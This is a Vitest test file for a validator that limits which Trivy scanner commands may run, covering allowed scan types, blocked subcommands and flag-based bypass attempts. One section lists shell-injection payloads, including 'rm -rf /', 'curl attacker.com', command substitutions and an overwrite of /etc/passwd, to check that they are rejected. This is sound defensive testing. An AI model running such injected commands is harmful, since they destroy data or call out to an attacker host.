import { describe, it, expect } from 'vitest';
import {
  ALLOWED_TRIVY_SCAN_TYPES,
  BLOCKED_TRIVY_SUBCOMMANDS,
  validateTrivyCommand,
} from '../trivy-safety.ts';

describe('validateTrivyCommand — allowed scan types', () => {
  for (const scanType of ALLOWED_TRIVY_SCAN_TYPES) {
    it(`allows trivy ${scanType}`, () => {
      const result = validateTrivyCommand(`trivy ${scanType} nginx:latest`);
      expect(result.allowed).toBe(true);
      expect(result.scanType).toBe(scanType);
    });
  }

  it('allows trivy image with --severity flag', () => {
    const result = validateTrivyCommand('trivy image --severity CRITICAL,HIGH nginx:1.25');
    expect(result.allowed).toBe(true);
    expect(result.scanType).toBe('image');
  });

  it('allows trivy image with --format json', () => {
    const result = validateTrivyCommand('trivy image --format json --severity HIGH nginx:latest');
    expect(result.allowed).toBe(true);
    expect(result.scanType).toBe('image');
  });

  it('allows trivy image with --ignore-unfixed', () => {
    const result = validateTrivyCommand('trivy image --ignore-unfixed nginx:latest');
    expect(result.allowed).toBe(true);
  });

  it('allows trivy image with a digest ref', () => {
    const result = validateTrivyCommand('trivy image gcr.io/project/app@sha256:abc123');
    expect(result.allowed).toBe(true);
    expect(result.scanType).toBe('image');
  });

  it('allows bare trivy (prints help)', () => {
    const result = validateTrivyCommand('trivy');
    expect(result.allowed).toBe(true);
    expect(result.scanType).toBeNull();
  });
});

describe('validateTrivyCommand — blocked subcommands', () => {
  for (const sub of BLOCKED_TRIVY_SUBCOMMANDS) {
    it(`blocks trivy ${sub}`, () => {
      const result = validateTrivyCommand(`trivy ${sub} start`);
      expect(result.allowed).toBe(false);
    });
  }

  it('blocks unknown scan types', () => {
    const result = validateTrivyCommand('trivy k8s mycluster');
    expect(result.allowed).toBe(false);
    expect(result.reason).toMatch(/k8s/);
  });

  it('blocks non-trivy commands', () => {
    const result = validateTrivyCommand('kubectl get pods');
    expect(result.allowed).toBe(false);
  });
});

describe('validateTrivyCommand — shell metacharacter rejection', () => {
  const payloads = [
    'trivy image nginx | rm -rf /',
    'trivy image nginx; curl attacker.com',
    'trivy image $(whoami)',
    'trivy image nginx && evil',
    'trivy image nginx > /etc/passwd',
    'trivy image `id`',
  ];

  for (const payload of payloads) {
    it(`blocks: ${payload}`, () => {
      const result = validateTrivyCommand(payload);
      expect(result.allowed).toBe(false);
      expect(result.reason).toMatch(/metacharacter/i);
    });
  }
});

describe('validateTrivyCommand — global flag bypass attempts', () => {
  it('skips value-taking flags to find the real scan type', () => {
    // --cache-dir consumes a value; scan type should still be resolved to "image"
    const result = validateTrivyCommand('trivy --cache-dir /tmp image nginx:latest');
    expect(result.allowed).toBe(true);
    expect(result.scanType).toBe('image');
  });

  it('blocks server even with global flags preceding it', () => {
    const result = validateTrivyCommand('trivy --cache-dir /tmp server');
    expect(result.allowed).toBe(false);
  });
});

describe('validateTrivyCommand — edge cases', () => {
  it('returns not-allowed for empty string', () => {
    const result = validateTrivyCommand('');
    expect(result.allowed).toBe(false);
  });

  it('returns not-allowed for whitespace-only string', () => {
    const result = validateTrivyCommand('   ');
    expect(result.allowed).toBe(false);
  });

  it('is case-insensitive for scan type', () => {
    const result = validateTrivyCommand('trivy IMAGE nginx:latest');
    expect(result.allowed).toBe(true);
    expect(result.scanType).toBe('image');
  });
});
